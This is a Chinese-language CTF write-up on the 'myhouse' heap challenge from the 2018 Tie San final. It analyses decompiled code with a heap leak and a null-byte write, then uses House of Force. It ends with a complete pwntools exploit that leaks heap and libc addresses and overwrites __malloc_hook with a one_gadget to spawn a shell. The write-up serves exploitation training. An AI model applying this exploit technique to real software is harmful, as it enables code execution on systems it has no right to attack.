---
title: 2018铁三总决赛_myhouse
date: 2019-03-21 09:11:24
tags:
---
House of Force-
<!--more-->
# Setout
当时想了三四个小时..一直以为是有溢出然后house of force...虽然知道有个一定程度内的任意字节写0但是没用起来...
昨晚看了song师傅给的exp感觉这个利用确实厉害...

知道利用方式后其他比较常规
# Analysis
```python
➜  Desktop checksec myhouse 
[*] '/home/n132/Desktop/myhouse'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
本题主干部分没有什么漏洞.add 一个`room` 往`room`里面写东西
主要是发现写入没大小限制就往house of force方向想了.

主要的问题函数是
```python
unsigned __int64 add_house()
{
  int tmp; // eax
  size_t size; // [rsp+0h] [rbp-30h]
  __int64 v3; // [rsp+8h] [rbp-28h]
  char s; // [rsp+10h] [rbp-20h]
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  memset(&s, 0, 0x10uLL);
  myputs("What's your name?");
  read(0, &owner, 0x20uLL);
  myputs("What is the name of your house?");
  house_name = malloc(0x100uLL);
  read(0, house_name, 0x100uLL);
  myputs("What is the size of your house?");
  read(0, &s, 0xFuLL);
  tmp = atoi(&s);
  v3 = tmp;
  size = tmp;
  if ( (unsigned __int64)tmp > 0x300000 )
  {
    do
    {
      myputs("Too large!");
      read(0, &s, 0xFuLL);
      size = atoi(&s);
    }
    while ( size > 0x300000 );
  }
  house_des = malloc(size);
  myputs("Give me its description:");
  read(0, house_des, size - 1);
  *((_BYTE *)house_des + v3 - 1) = 0;
  return __readfsqword(0x28u) ^ v5;
}
```
主要有两点:
* owner 处没有截断导致可能泄露heap`  read(0, &owner, 0x20uLL);`
* `  *((_BYTE *)house_des + v3 - 1) = 0;`这个任意字节写0虽然很好发现但是利用很精妙(当时就是发现了这个感觉不可能用上....orz)

# 利用
主要我利用不起来的原因是我没试过就想当然地认为 我们不知道libc的base导致我们只能影响我们知道的地址(例如bss啥的)但是忽略了当我们mmap时我们不需要知道确切的base我们只要知道偏移就可以改上面的数值.

* 如何控制top_size
```
* 在name中填满`\xff`
* 输入size:x(x>0x30000)
* 再次输入size:y < 0x30000获得chunk Z
* x要求是 Z+x---->main_arena.top
```
这样我们就完成了house of force
* show to leak heap
* malloc to force bss
* modify housed to leak libc_base
* modify room to control __malloc_hook

# exp
```python
from pwn import *
#context.log_level='debug'
def name(c,h):
	p.sendafter("name?\n",c)
	p.sendafter("house?\n",h)
def cmd(c):
	p.sendlineafter("Your choice:\n",str(c))
def add(size,):
	cmd(1)
	p.sendlineafter("room?\n",str(size))
def fill(c):
	cmd(2)
	p.sendlineafter("shining!\n",c)
def show():
	cmd(3)

p=process("./myhouse")
name("A"*0x20,"\xff"*0x100)

p.sendafter("house?\n",str(0x300001-0x3c94f0+11*8-(0x7faf3a51db78-0x7faf3a519b20)+11*8))
#gdb.attach(p,'b *0x000000000400A34')
p.sendafter("arge!\n",str(0x20000))

p.sendlineafter("description:\n",'data')



show()
p.readuntil("A"*0x20)
heap=u64(p.readline()[:-1].ljust(0x8,'\x00'))-0x10


size=-heap+0x6020b0-0x110
add(size)
add(0x80)
fill(p64(0x6020e0)+p64(0x6020c0)+p64(0xffff)+p64(0)+"A"*0x20+p64(0x000000000602048))

show()

p.readuntil("ame:\n")

base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7a91130-0x00007ffff7a0d000)
fill(p64(0x6020e0)+p64(0x000000000602048)+p64(0xffff)+p64(0)+"A"*0x20+p64(0x000000000602048))
fill(p64(base+0x45216))
add(0)
log.warning(hex(heap))
log.warning(hex(base))
#
p.interactive('nier>>')
```
# review 
很经典感觉那个利用像是神来之笔.可以作为house of force的例题.--